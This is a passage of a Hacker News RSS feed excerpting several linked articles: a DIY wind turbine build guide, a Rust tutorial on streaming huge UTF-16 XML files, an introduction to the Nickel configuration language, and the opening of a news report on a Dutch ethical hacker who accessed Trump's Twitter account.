<p>Tape the pages together so that the 10cm dimension marks overlap  as closely as possible. Best way to do this is on a window pane  during the day, so you can see both pages showing through.<br>
  With  a craft knife and the angle aluminium as a straight edge, cut out the  outer border of the template.<br>
  Any time you're cutting, always  make sure your other hand is never in front of the knife, so if you  slip you're not going to slice yourself. The angle aluminium is good  for this, as the vertical bit effectively shields the hand holding  it.</p>
<p><strong>2</strong><strong>:</strong><br>
  Take an aluminium sheet  and measure a box 42cm x 48cm. Draw a line half way up the 48cm  length so you have two boxes measuring 42cm x 24cm. Score the outer  lines with the Stanley knife and straight edge. You're not trying to  cut through the metal, just create a line that can then be popped out  later. A good method is to score once lightly, then a second time a  bit deeper.<br>
  Do not score the 24cm halfway line.</p>
<p>Flex the metal so that it bends at a score line, then flex back  the other way. Do this a couple times and it should split. Do the  same for the other score and remove the outer metal. Keep it for  later. </p>
<p><strong>3</strong><strong>:</strong><br>
  Tape the template to the  metal rectangle (from now on to be referred to as a 'former') so that  the long edge of the paper sits on the middle line and the right hand  edges of both line up. Don't worry if the other edges don't align  perfectly.</p>
<p>With blade and straight edge, score out the template curve,  including the triangles at each end. It's not essential that this be  100% perfect, but try to get the first one reasonably nice as you can  then use it as a template for the rest.</p>
<p>Score, flex, and remove the two triangles of metal outside the  template.</p>
<p><strong>4</strong><strong>:</strong><br>
  Mark the centers of the  little circles on the paper template with a marker pen so that  they're visible from the other side and flip the paper over so that  the printed side is down on the other half of the former, keeping the  long edge on the middle line. Retape so it doesn't shift.<br>
  Give  the curved score a couple of flexes and tear it out. Remove the two  small triangles. Be careful not to bend the unscored metal too much  as you're doing this as it may weaken it.</p>
<p>You now have your first former. Repeat steps 2 through 3 so that  you have a total of 6 formers. You can use the first former as a  cutting template rather than the paper. On three of the formers have  the 24cm line drawn on the front, the other three on the back.</p>
<p><strong>5</strong><strong>:</strong><br>
  Take all six formers and peg them together  so that they are as nicely aligned as possible.<br>
  Use tape to  attach them if you don't have clothes pegs. </p>
<p>Drill each of the 16 holes through all six formers with a 4mm bit.  Drill the center hole first, as this is the only one that needs to be  reasonably accurate. It can help to put a bolt through that first  hole to keep the formers from shifting around as you drill.</p>
<p>If the holes on your template are laid out a little differently  than those in the animation it'll be because the template is more  up to date.</p>
<p>Remove the template and unpeg the formers.<br>
  Place a former  with the 24cm line slightly overhanging the edge of the table. Place  the straight edge on the middle line and bend up to 90 degrees.  Repeat with all six, with three formers bent shiny side up and three  bent shiny side down. <br>
  Put the formers aside. </p>
<p><strong>6</strong><strong>:</strong><br>
  Take an aluminium sheet  and flatten out any bends in the metal. Cut the long edge down to  67cm.</p>
<p>Draw a line 2cm from one of the 67cm edges, flip the sheet over  and draw another line 2cm from the opposite edge on the other side of  the metal.</p>
<p>repeat with 2 more sheets and peg all 3 together so that each  drawn line is aligned to the edge of the sheet above it.</p>
<p>Mark the edge at 4cm, 6, 8, 10, 18, 26, 34, and then every 2cm up  to and including 64cm<br>
  Keep in mind that one side has a score at  4cm from the edge, the other at 3cm.</p>
<p>Flip the sheets over, making sure they don't lose their alignment.  Mark and score the same as the first edge. Make sure both have the  4cm gap on the same edge.</p>
<p><strong>7</strong><strong>:</strong><br>
  Tap the sheets on the  table so that they are aligned on top of each other.<br>
  From the  4cm end draw a vertical line at 19cm from the edge, and one at 33cm  from the edge.<br>
  Mark each line at 3cm and 20cm from both ends.</p>
<p>Drill all 3 sheets with 4mm holes at all 8 marks. If you're  making a six vane turbine rather than three you can drill all six  sheets at once as easily.<br>
  Unpeg the sheets.</p>
<p><strong>8:</strong><br>
  Place a sheet so that the second 3cm edge is  overhanging the table. Place the straight edge on …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://opensourcelowtech.org/wind_turbine.html">http://opensourcelowtech.org/wind_turbine.html</a></em></p>]]>
            </description>
            <link>http://opensourcelowtech.org/wind_turbine.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24865731</guid>
            <pubDate>Fri, 23 Oct 2020 03:17:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[U.S. faculty job market tanks]]>
            </title>
            <description>
<![CDATA[
Score 255 | Comments 258 (<a href="https://news.ycombinator.com/item?id=24864838">thread link</a>) | @SQL2219
<br/>
October 22, 2020 | https://sci-hub.st/10.1126/science.370.6514.272 | <a href="https://web.archive.org/web/*/https://sci-hub.st/10.1126/science.370.6514.272">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://sci-hub.st/10.1126/science.370.6514.272</link>
            <guid isPermaLink="false">hacker-news-small-sites-24864838</guid>
            <pubDate>Fri, 23 Oct 2020 00:20:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[XMHell: Handling 38GB of UTF-16 XML with Rust]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 58 (<a href="https://news.ycombinator.com/item?id=24863352">thread link</a>) | @aazaa
<br/>
October 22, 2020 | http://usethe.computer/posts/14-xmhell.html | <a href="https://web.archive.org/web/*/http://usethe.computer/posts/14-xmhell.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

        
        <h3>2020-05-11</h3>

<p>A couple weekends ago, I found myself with the desire to fetch oil and gas production data for a specific county in New Mexico from the <a href="http://www.emnrd.state.nm.us/OCD/">New Mexico Oil Conservation Division</a> (OCD).</p>
<p>Fortunately, the OCD provides access to historical well production via an FTP server. I worked out that I needed to download <code>/Public/OCD/OCD Interface v1.1/volumes/wcproduction/wcproduction.zip</code>… and then my fortune ran out.</p>
<p>The first thing I noticed was the file size. The OCD doesn’t seem to provide a way to query a limited time- or area-based subset of production history data, so we’re stuck with a single zip file for “all of New Mexico since the dawn of time”<a href="#fn1" id="fnref1"><sup>1</sup></a>. The result is a whopping 712MB ZIP file.</p>
<p>Here’s where I knew I was in trouble: the only thing inside was a single 38 GB file called <code>wcproduction.xml</code>.</p>
<h3>“XML is like violence: when it fails, apply more”</h3>
<p>XML—the “extensible markup language”. Along with Java’s <code>AbstractBeanFactoryTemplateFactory</code>s, and the entirety of Geocities, XML epitomizes the excesses of the late 90s and early 2000s computing culture.</p>
<p>No two parsers can ever quite seem to agree on the details, and the verbosity quotient is such that an attempt to “print source” for the average “XHTML” web site circa 2001 would be likely to completely deforest the Amazon. The one thing that can be said in its favor is that it can indeed be used to somewhat faithfully represent a tree (the in-memory hierarchical structure, not the thing we just killed millions of).</p>
<p>Enough griping, though: the “XML everywhere” wave has long subsided. We’ve got to figure out how to deal with what it left behind. While it’s the most common approach to parsing XML, it’s also clear that loading the entire file into memory is unlikely to work: the workstation I’m writing this on only has 32GB of RAM. Additionally, it doesn’t make sense to build a syntax tree for the entire document when we are only interested in a small subset of the data. The XML world refers to this—here, unworkable—approach as a “DOM parser”, but it’s just the common case of parsing for any formal language—we incrementally construct an in-memory representation (that is, a syntax tree) of an entire document. It works well when we need the entire result and the in-memory representation fits comfortably within our resource budget: for instance, when compiling computer programs from source code, or rendering a web page from HTML.</p>
<p>Instead, we’ll use a streaming approach (the XML folks call this “SAX”, for reasons I didn’t care enough to research). In this approach, we’ll parse the document incrementally and receive results via an event-based API. This will let us only handle the data we care about, and minimize the amount we need to keep in memory at once.</p>
<p>For good performance on this “huge” data set, and to leverage an easily-accessible ecosystem of libraries which includes both streaming ZIP archive handling and high-performance streaming XML parsers, we’ll write a data extraction program in the <a href="https://www.rust-lang.org/">Rust</a> programming language.</p>
<h3>(Re)Write It In Rust</h3>
<p><img alt="Rust Evangelism Strike Force logo" width="400px" src="http://usethe.computer/images/resf.png"></p>
<p>I’m not going to belabor the reasons Rust is exciting here. It’s a statically-typed, compiled language with a nice mix of performance and control, expressiveness, and safety. I find it to be a nice choice for the sorts of “systems programming” tasks in which I might also use C or C++, but the build tools and package management system (<a href="https://crates.io/">Cargo</a>) also make it a viable choice for these sorts of “script-like” programs, especially when performance may be an issue.</p>
<p>Let’s begin by creating a new Rust project using Cargo. We want a program (binary), not a library:</p>
<pre><code>$ cargo new ocd_production --bin</code></pre>
<p>That’ll create a new directory <code>ocd_production</code> containing a Rust project. Inside we have a “hello world” program in <code>src/main.rs</code> and a specification for the project in <code>Cargo.toml</code>. The directory is also a <code>git</code> repository, which is handy.</p>
<p>There’s no sense in unpacking the ZIP file when we can stream our XML file out of it using the <a href="https://crates.io/crates/zip"><code>zip</code></a> library. Let’s begin by just previewing the text of the XML file.</p>
<p>We’ll add <code>zip</code> to our <code>Cargo.toml</code>:</p>
<pre><code>[package]
name = "ocd_production"
version = "0.1.0"
authors = ["Derrick W. Turk &lt;dwt@terminusdatascience.com&gt;"]
edition = "2018"

[dependencies]
zip = "0.5.5"</code></pre>
<p>A caveat before we begin: this is going to be “script” quality code. My goal is to process one file quickly and reliably, not to build a reusable library or produce “production-ready” code. As such, this code is going to skip some “best practices”: everything will be in one long <code>main.rs</code> file, and error handling will be oriented toward catching error conditions and aborting the program rather than toward error recovery or human-friendly error messages.</p>
<p>With that in mind, let’s write a short program in <code>src/main.rs</code> to take a ZIP file path as a command-line argument, and stream a few KB at a time from the file contained inside:</p>
<pre id="cb3"><code><a id="cb3-1" data-line-number="1"><span>use</span> std::<span>{</span></a>
<a id="cb3-2" data-line-number="2">    env,</a>
<a id="cb3-3" data-line-number="3">    error::Error,</a>
<a id="cb3-4" data-line-number="4">    fs::File,</a>
<a id="cb3-5" data-line-number="5">    io::Read,</a>
<a id="cb3-6" data-line-number="6">    <span>str</span>,</a>
<a id="cb3-7" data-line-number="7"><span>}</span>;</a>
<a id="cb3-8" data-line-number="8"></a>
<a id="cb3-9" data-line-number="9"><span>use</span> zip::ZipArchive;</a>
<a id="cb3-10" data-line-number="10"></a>
<a id="cb3-11" data-line-number="11"><span>const</span> BUF_SIZE: <span>usize</span> = <span>4096</span>; <span>// 4kb at once</span></a>
<a id="cb3-12" data-line-number="12"></a>
<a id="cb3-13" data-line-number="13"><span>fn</span> main() -&gt; <span>Result</span>&lt;(), <span>Box</span>&lt;dyn Error&gt;&gt; <span>{</span></a>
<a id="cb3-14" data-line-number="14">    <span>let</span> path = env::args().nth(<span>1</span>).ok_or(<span>"no filename provided"</span>)?;</a>
<a id="cb3-15" data-line-number="15">    <span>let</span> zipfile = File::open(path)?;</a>
<a id="cb3-16" data-line-number="16">    <span>let</span> <span>mut</span> zip = ZipArchive::new(zipfile)?;</a>
<a id="cb3-17" data-line-number="17"></a>
<a id="cb3-18" data-line-number="18">    <span>if</span> zip.len() != <span>1</span> <span>{</span></a>
<a id="cb3-19" data-line-number="19">        <span>Err</span>(<span>"expected one file in zip archive"</span>)?;</a>
<a id="cb3-20" data-line-number="20">    <span>}</span></a>
<a id="cb3-21" data-line-number="21"></a>
<a id="cb3-22" data-line-number="22">    <span>let</span> <span>mut</span> xmlfile = zip.by_index(<span>0</span>)?;</a>
<a id="cb3-23" data-line-number="23">    <span>println!</span>(<span>"file is {}, size {} bytes"</span>, xmlfile.name(), xmlfile.size());</a>
<a id="cb3-24" data-line-number="24"></a>
<a id="cb3-25" data-line-number="25">    <span>let</span> <span>mut</span> buf = <span>[</span><span>0u8</span>; BUF_SIZE<span>]</span>;</a>
<a id="cb3-26" data-line-number="26">    <span>loop</span> <span>{</span></a>
<a id="cb3-27" data-line-number="27">        <span>if</span> xmlfile.read(&amp;<span>mut</span> buf<span>[</span>..<span>]</span>)? == <span>0</span> <span>{</span></a>
<a id="cb3-28" data-line-number="28">            <span>break</span>;</a>
<a id="cb3-29" data-line-number="29">        <span>}</span></a>
<a id="cb3-30" data-line-number="30"></a>
<a id="cb3-31" data-line-number="31">        <span>println!</span>(<span>"read chunk: {}"</span>, <span>str</span>::from_utf8(&amp;buf<span>[</span>..<span>]</span>)?);</a>
<a id="cb3-32" data-line-number="32">    <span>}</span></a>
<a id="cb3-33" data-line-number="33"></a>
<a id="cb3-34" data-line-number="34">    <span>Ok</span>(())</a>
<a id="cb3-35" data-line-number="35"><span>}</span></a></code></pre>
<p>We’ll compile in “release mode” (that is, with optimizations enabled) and run against the ZIP file:</p>
<pre><code>$ cargo run --release wc_production.zip</code></pre>
<blockquote>
<p><code>file is wcproduction.xml, size 38535541060 bytes</code><br>
<code>Error: Utf8Error { valid_up_to: 0, error_len: Some(1) }</code></p>
</blockquote>
<p>That’s discouraging.</p>
<h3>Only 90s Kids Will Remember This File Encoding</h3>
<p>Like many “modern” languages, Rust’s standard string type is a <a href="https://en.wikipedia.org/wiki/UTF-8">UTF-8</a> encoded <a href="https://home.unicode.org/">Unicode</a> string. This is the right answer for a <a href="https://utf8everywhere.org/">lot of good reasons</a>, but it’s only become popular in recent years.</p>
<p>In this case, we’ve clearly encountered some text which is not encoded in UTF-8. In fact, we’ve hit an invalid byte as the very first byte. Let’s look at raw bytes, rather than Rust strings, so that we can see what’s going on. We’ll edit <code>src/main.rs</code>:</p>
<pre id="cb5"><code><a id="cb5-1" data-line-number="1"><span>use</span> std::<span>{</span></a>
<a id="cb5-2" data-line-number="2">    env,</a>
<a id="cb5-3" data-line-number="3">    error::Error,</a>
<a id="cb5-4" data-line-number="4">    fs::File,</a>
<a id="cb5-5" data-line-number="5">    io::Read,</a>
<a id="cb5-6" data-line-number="6">    <span>str</span>,</a>
<a id="cb5-7" data-line-number="7"><span>}</span>;</a>
<a id="cb5-8" data-line-number="8"></a>
<a id="cb5-9" data-line-number="9"><span>use</span> zip::ZipArchive;</a>
<a id="cb5-10" data-line-number="10"></a>
<a id="cb5-11" data-line-number="11"><span>const</span> BUF_SIZE: <span>usize</span> = <span>4096</span>; <span>// 4kb at once</span></a>
<a id="cb5-12" data-line-number="12"></a>
<a id="cb5-13" data-line-number="13"><span>fn</span> main() -&gt; <span>Result</span>&lt;(), <span>Box</span>&lt;dyn Error&gt;&gt; <span>{</span></a>
<a id="cb5-14" data-line-number="14">    <span>let</span> path = env::args().nth(<span>1</span>).ok_or(<span>"no filename provided"</span>)?;</a>
<a id="cb5-15" data-line-number="15">    <span>let</span> zipfile = File::open(path)?;</a>
<a id="cb5-16" data-line-number="16">    <span>let</span> <span>mut</span> zip = ZipArchive::new(zipfile)?;</a>
<a id="cb5-17" data-line-number="17"></a>
<a id="cb5-18" data-line-number="18">    <span>if</span> zip.len() != <span>1</span> <span>{</span></a>
<a id="cb5-19" data-line-number="19">        <span>Err</span>(<span>"expected one file in zip archive"</span>)?;</a>
<a id="cb5-20" data-line-number="20">    <span>}</span></a>
<a id="cb5-21" data-line-number="21"></a>
<a id="cb5-22" data-line-number="22">    <span>let</span> <span>mut</span> xmlfile = zip.by_index(<span>0</span>)?;</a>
<a id="cb5-23" data-line-number="23">    <span>println!</span>(<span>"file is {}, size {} bytes"</span>, xmlfile.name(), xmlfile.size());</a>
<a id="cb5-24" data-line-number="24"></a>
<a id="cb5-25" data-line-number="25">    <span>let</span> <span>mut</span> buf = <span>[</span><span>0u8</span>; BUF_SIZE<span>]</span>;</a>
<a id="cb5-26" data-line-number="26">    <span>loop</span> <span>{</span></a>
<a id="cb5-27" data-line-number="27">        <span>if</span> xmlfile.read(&amp;<span>mut</span> buf<span>[</span>..<span>]</span>)? == <span>0</span> <span>{</span></a>
<a id="cb5-28" data-line-number="28">            <span>break</span>;</a>
<a id="cb5-29" data-line-number="29">        <span>}</span></a>
<a id="cb5-30" data-line-number="30"></a>
<a id="cb5-31" data-line-number="31">        <span>println!</span>(<span>"read chunk: {:?}"</span>, &amp;buf<span>[</span>..<span>]</span>);</a>
<a id="cb5-32" data-line-number="32">        <span>// we'll just dump the first chunk so we can see what's going on</span></a>
<a id="cb5-33" data-line-number="33">        <span>break</span>;</a>
<a id="cb5-34" data-line-number="34">    <span>}</span></a>
<a id="cb5-35" data-line-number="35"></a>
<a id="cb5-36" data-line-number="36">    <span>Ok</span>(())</a>
<a id="cb5-37" data-line-number="37"><span>}</span></a></code></pre>
<blockquote>
<p><code>file is wcproduction.xml, size 38535541060 bytes</code><br>
<code>read chunk: [255, 254, 60, 0, 114, 0, 111, 0, 111, 0, 116, 0, 32, 0, 120, 0, 109, 0, 108, 0, 110, 0, 115, 0, 58, 0, 120, 0, 115, 0, 105, 0, 61, 0, 34, 0, 104, 0, 116, 0, 116, 0, 112, 0, 58, 0, 47, 0, 47, 0, 119, 0, 119, 0, 119, 0, 46, 0, 119, 0, 51, 0, 46, 0, 111, 0, 114, 0, 103, 0, 47, 0, 50, 0, 48, 0, 48, 0, 49, 0, 47, 0, 88, 0, 77, 0, 76, 0, 83, 0, 99, 0, 104, 0, 101, 0, 109, 0, 97, 0, 45, 0, 105, 0, 110, 0, 115, 0, 116, 0, 97, 0, 110, 0, 99, 0, 101, 0, 34, 0, 62, 0, 60, 0, 120, 0, 115, 0, 100, 0, 58, 0, 115, 0, 99, 0, 104, 0, 101, 0, 109, 0, 97, 0, 32, 0, 116, 0, 97, 0, 114, 0, 103, 0, 101, 0, 116, 0, 78, 0, 97, 0, ...</code></p>
</blockquote>
<p>At this point, recovering Windows programmers and Java programmers are wincing in sympathy. Two things immediately stand out: first, we’ve got a series of bytes alternating between the printable ASCII range and zero, and second, we open with <code>0xFF 0xFE</code>—that’s a <a href="https://en.wikipedia.org/wiki/Byte_order_mark">BOM</a>. We’re dealing with <a href="https://en.wikipedia.org/wiki/UTF-16">UTF-16</a> in <a href="https://en.wikipedia.org/wiki/Endianness">little-endian</a> byte order.</p>
<p>If you want the short version of how we got here, I suggest reading <a href="https://www.kingjamesbibleonline.org/Genesis-Chapter-11/">Chapter 11 of the Book of Genesis</a>.</p>
<p>The slightly longer version goes like this: in the late 80s, some forward-thinking folks began thinking seriously about the fact that non-Americans were using computers. In fact, some of the world’s computer users weren’t even Europeans, who could usually get away with smuggling some funny accented Latin characters into that “unused” eighth bit of <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a>. Of course, the non-Latin alphabet folks were doing just fine on their own: they had their own character sets and encodings.</p>
<p>But wouldn’t it be nice if we could all share one universal character set? Some sort of… “Uni”versal “code”? Surely, they reasoned, the Chinese/Japanese/Korean (CJK) character sets, the Latin alphabet, the Cyrillic alphabet, and anything else of interest could all be encoded into a shared 16-bit range. 65,536 characters should be enough for all the world’s languages! We’d just decide that the new “character type” was a 16-bit integer instead of an 8-bit integer; strings could still be arrays of these characters, and doubling the storage required for existing ASCII text was an acceptable price to pay for global harmony. Big names committed to this new “Universal Character Set” (<a href="https://en.wikipedia.org/wiki/Universal_Coded_Character_Set">UCS-2</a>): Microsoft rebuilt Windows’ string handling to use strings of two-byte UCS-2 “wide characters”, and the hot new Java programming language made the same decision.</p>
<p>As you can imagine, 65,536 characters did not turn out to be nearly enough for all the world’s languages—much less the wave of weird 👩‍👩‍👦‍👦 characters 💯 yet to 🔜 appear. Unicode ended up adopting a 32-bit address space, supporting over 4 billion characters. We’re unlikely to fill that any time soon, even given the breathtaking pace of emoji creation.</p>
<p>However, it also …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://usethe.computer/posts/14-xmhell.html">http://usethe.computer/posts/14-xmhell.html</a></em></p>]]>
            </description>
            <link>http://usethe.computer/posts/14-xmhell.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24863352</guid>
            <pubDate>Thu, 22 Oct 2020 21:11:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nickel: Better Configuration for Less]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 60 (<a href="https://news.ycombinator.com/item?id=24858456">thread link</a>) | @figomore
<br/>
October 22, 2020 | https://www.tweag.io/blog/2020-10-22-nickel-open-sourcing/ | <a href="https://web.archive.org/web/*/https://www.tweag.io/blog/2020-10-22-nickel-open-sourcing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>We are making the <a href="https://www.github.com/tweag/nickel">Nickel</a> repository public. Nickel is an experimental configuration
language developed at Tweag. While this is not the time for the first
release yet, it is an occasion to talk about this project. The goal of this
post is to give a high-level overview of the project. If your curiosity is tickled
but you are left wanting to learn more, fear not, as we will publish
more blog posts on specific aspects of the language in the future. But for
now, let’s have a tour!</p>
<p>[<strong>Disclaimer</strong>: the actual syntax of Nickel being still worked on, I’m freely
using as-of-yet non-existing syntax for illustrative purposes. The underlying
features are however already supported.]</p>
<h2>The inception</h2>
<p>We, at Tweag, are avid users of the <a href="https://nixos.org/">Nix</a> package manager. As it
happens, the configuration language for Nix (also called Nix) is
a pretty good configuration language, and would be applicable to many
more things than just package management.</p>
<p>All in all, the Nix language is a lazy JSON with functions. It is
simple yet powerful. It is used to generate Nix’s package descriptions
but would be well
suited to write any kind of configuration (<a href="https://www.terraform.io/">Terraform</a>,
<a href="https://kubernetes.io/">Kubernetes</a>, etc…).</p>
<p>The rub is that the interpreter for Nix-the-language is tightly
coupled with Nix-the-package manager. So, as it stands, using the
Nix language for anything else than package management is a rather
painful exercise.</p>
<p>Nickel is our attempt at answering the question: what would
Nix-the-language look like if it was split from the package manager?
While taking the opportunity to improve the language a little,
building on the experience of the Nix community over the years.</p>
<h2>What’s Nickel, exactly ?</h2>
<p>Nickel is a lightweight generic configuration language. In that it can
replace YAML as your application’s configuration language. Unlike
YAML, though, it anticipates large configurations by being
programmable. Another way to use Nickel is to generate static
configuration files — <em>e.g.</em> in JSON, YAML — that are then fed to another system. Like
Nix, it is designed to have a simple, well-understood core: at its
heart, it is JSON with functions.</p>
<p>But past experience with Nix also brings some insights on which aspects of the
language could be improved. Whatever the initial scope of a language is, it will
almost surely be used in a way that deviates from the original plan: you create
a configuration language to describe software packages, and next thing you know,
somebody needs to implement a <a href="https://github.com/NixOS/nixpkgs/pull/11484">topological sort</a>.</p>
<p>Nickel strives to retain the simplicity of Nix, while extending it
according to this feedback.
Though, you can do perfectly fine without the new features and just write Nix-like code.</p>
<h2>Yet another configuration language</h2>
<p>At this point you’re probably wondering if this hasn’t already been done elsewhere.
It seems that more and more languages are born every day, and surely there
already exist configuration languages with a similar purpose to Nickel:
<a href="https://github.com/bazelbuild/starlark">Starlark</a>, <a href="https://jsonnet.org/">Jsonnet</a>, <a href="https://dhall-lang.org/">Dhall</a> or <a href="https://cuelang.org/">CUE</a>, to name
a few. So why Nickel?</p>
<h2>Typing</h2>
<p>Perhaps the most important difference with other configuration languages is
Nickel’s approach to typing.</p>
<p>Some languages, such as <a href="https://jsonnet.org/">Jsonnet</a> or <a href="https://github.com/bazelbuild/starlark">Starlark</a>, are not
statically typed. Indeed, static types can be seen as superflous in a configuration
language: if your program is only run once on fixed inputs, any type error will
be reported at run-time anyway. Why bother with a static type system?</p>
<p>On the other hand, more and more systems rely on complex configurations, such as
cloud infrastructure (<a href="https://www.terraform.io/">Terraform</a>, <a href="https://kubernetes.io/">Kubernetes</a> or
<a href="https://github.com/NixOS/nixops">NixOps</a>), leading the corresponding programs to become increasingly
complex, to the point where static types are beneficial. For reusable code —
that is, library functions — static types add structure, serve as
documentation, and eliminate bugs early.</p>
<p>Although less common, some configuration languages are statically typed,
including <a href="https://dhall-lang.org/">Dhall</a> and <a href="https://cuelang.org/">CUE</a>.</p>
<p>Dhall features a powerful type system that is able to type a wide range of
idioms. But it is complex, requiring some experience to become fluent in.</p>
<p>CUE is closer to what we are striving for. It has an optional and well-behaved
type system with strong guarantees. In exchange for which, one can’t write nor
type higher-order functions in general, even if some simple functions are
possible to encode.</p>
<h3>Gradual typing</h3>
<p>Nickel, features a <a href="https://en.wikipedia.org/wiki/Gradual_typing"><em>gradual type system</em></a>.
Gradual types are unobtrusive: they make it possible to statically
type reusable parts of your programs, but you are still free to write
configurations without any types. The
interpreter safely handles the interaction between the typed and untyped worlds.</p>
<p>Concretely, typed library code like this:</p>
<div data-language="text"><pre><code>// file: mylib.ncl
{
  numToStr : Num -&gt; Str = fun n =&gt; ...;
  makeURL : Str -&gt; Str -&gt; Num -&gt; Str = fun proto host port =&gt;
    "${proto}://${host}:${numToStr port}/";
}</code></pre></div>
<p>can coexist with untyped configuration code like this:</p>
<div data-language="text"><pre><code>// file: server.ncl
let mylib = import "mylib.ncl" in
let host = "myproject.com" in
{
  host = host;
  port = 1;
  urls = [
    mylib.makeURL "myproto" host port,
    {protocol = "proto2"; server = "sndserver.net"; port = 4242}
  ];
}</code></pre></div>
<p>In the first snippet, the body of <code>numToStr</code> and <code>makeURL</code> are statically
checked: wrongfully calling <code>numToStr proto</code> inside <code>makeURL</code> would raise an
error even if <code>makeURL</code> is never used. On the other hand, the second snippet is
not annotated, and thus not statically checked. In particular, we mix an URL
represented as a string together with one represented as a record in the same
list. The interpreter rather inserts run-time checks, or <em>contracts</em>, such
that if <code>makeURL</code> is misused then the program fails with an
appropriate error.</p>
<p>Gradual types also lets us keep the type system simple: even in
statically typed code if you want to write a component that the type
checker doesn’t know how to verify, you don’t have to type-check that
part.</p>
<h3>Contracts</h3>
<p>Complementary to the static type system, Nickel offers <em>contracts</em>. Contracts
offer precise and accurate dynamic type error reporting, even in the
presence of function types. Contracts are used internally by
Nickel’s interpreter to insert guards at the boundary between typed and untyped
chunks. Contracts are available to the programmer as well, to give them the
ability to enforce type assertions at run-time in a simple way.</p>
<p>One pleasant consequence of this design is that the exposure of the user to the
type system can be progressive:</p>
<ul>
<li>Users writing configurations can just write Nix-like code while ignoring
(almost) everything about typing, since you can seamlessly call a typed
function from untyped code.</li>
<li>Users writing consumers or verifiers of these configurations would use
contracts to model data schemas.</li>
<li>Users writing libraries would instead use the static type
system.</li>
</ul>
<p>An example of contract is given in the next section.</p>
<h2>Schemas</h2>
<p>While the basic computational blocks are functions, the basic data blocks in
Nickel are records (or objects in JSON). Nickel supports writing self-documenting
record schemas, such as:</p>
<div data-language="text"><pre><code>{
  host | type: Str
       | description: "The host name of the server."
       | default: "fallback.myserver.net"
  ;

  port | type: Num
       | description: "The port of the connection."
       | default: 4242
  ;

  url | type: Url
      | description: "The host name of the server."
  ;
}</code></pre></div>
<p>Each field can contain metadata, such as a description or default
value. These aim at being displayed in documentation, or queried by
tools.</p>
<p>The schema can then be used as a contract. Imagine that a function has
swapped two values in its output and returns:</p>
<div data-language="text"><pre><code>{
  host = "myproject.com",
  port = "myproto://myproject.com:1/",
  url = 1
}</code></pre></div>
<p>Without types, this is hard to catch. Surely, an error will eventually pop up
downstream in the pipeline, but how and when? Using the schema above
will make sure that, whenever the fields are actually evaluated, the
function will be blamed in the type error.</p>
<p>Schemas are actually part of a bigger story involving merging records
together, which, in particular, lets the schema instantiate missing
fields with their default values. It is very much inspired by the
<a href="https://nixos.org/manual/nixos/stable/index.html#sec-configuration-syntax">NixOs module system</a> and the <a href="https://cuelang.org/">CUE</a> language, but
it is a story for another time.</p>
<h2>Conclusion</h2>
<p>I hope that I gave you a sense of what Nickel is trying to achieve. I
only presented its most salient aspects: its gradual type system with
contracts, and built-in record schemas. But there is more to explore!
The language is not ready to be used in real world applications yet, but a good
share of the design presented here is implemented. If you are curious about it,
<a href="https://www.github.com/tweag/nickel">check it out</a>!</p></div></div></div></div>]]>
            </description>
            <link>https://www.tweag.io/blog/2020-10-22-nickel-open-sourcing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24858456</guid>
            <pubDate>Thu, 22 Oct 2020 14:35:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dutch Ethical Hacker Logs into Trump’s Twitter Account]]>
            </title>
            <description>
<![CDATA[
Score 95 | Comments 72 (<a href="https://news.ycombinator.com/item?id=24858219">thread link</a>) | @huijzer
<br/>
October 22, 2020 | https://www.volkskrant.nl/nieuws-achtergrond/dutch-ethical-hacker-logs-into-trump-s-twitter-account~badaa815/ | <a href="https://web.archive.org/web/*/https://www.volkskrant.nl/nieuws-achtergrond/dutch-ethical-hacker-logs-into-trump-s-twitter-account~badaa815/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section data-artstyle-marker="paywall"><section data-artstyle-marker="paywall"><figure data-element-id="71cde2cd-2335-4b84-b278-26460a834b90"><picture><source srcset="https://images2.persgroep.net/rcs/3L2D94DUUcqGUKV6M79IbLq4gq0/diocontent/177978718/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9&amp;desiredformat=webp" type="image/webp"><source srcset="https://images4.persgroep.net/rcs/YzsBRwzCgK61WPSnuHpvToefLsQ/diocontent/177978718/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9" type="image/jpeg"><img data-credit="Beeld Getty Images" data-height="885" data-original="https://images4.persgroep.net/rcs/YzsBRwzCgK61WPSnuHpvToefLsQ/diocontent/177978718/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9" data-title="U.S. President Donald Trump works on his phone during a roundtable at the State Dining Room of the White House June 18, 2020." data-width="1240" src="https://images4.persgroep.net/rcs/YzsBRwzCgK61WPSnuHpvToefLsQ/diocontent/177978718/_fitwidth/1240?appId=93a17a8fd81db0de025c8abd1cca1279&amp;quality=0.9"> </picture><figcaption><cite>U.S. President Donald Trump works on his phone during a roundtable at the State Dining Room of the White House June 18, 2020.</cite><span>Beeld Getty Images</span></figcaption></figure><p data-element-id="4aeb-3d95-850b-1e5e-3b11-54f3-9f2c-5a33">The researcher, Victor Gevers, had access to Trump’s personal messages, could post tweets in his name and change his profile. Gevers took screenshots when he had access to Trump’s account. These screenshots were shared with <i>de Volkskrant </i>by the monthly opinion magazine&nbsp;<a href="https://www.vn.nl/trump-twitter-hacked-again/" target="_blank">Vrij Nederland</a>. Dutch security experts find Gevers’ claim credible.</p><p data-element-id="f7d4-df7f-98ec-67eb-d049-540f-292a-5617">The Dutchman alerted Trump and American government services to the security leak. After a few days, he was contacted by the American Secret Service in the Netherlands. This agency is also responsible for the security of the American President and took the report 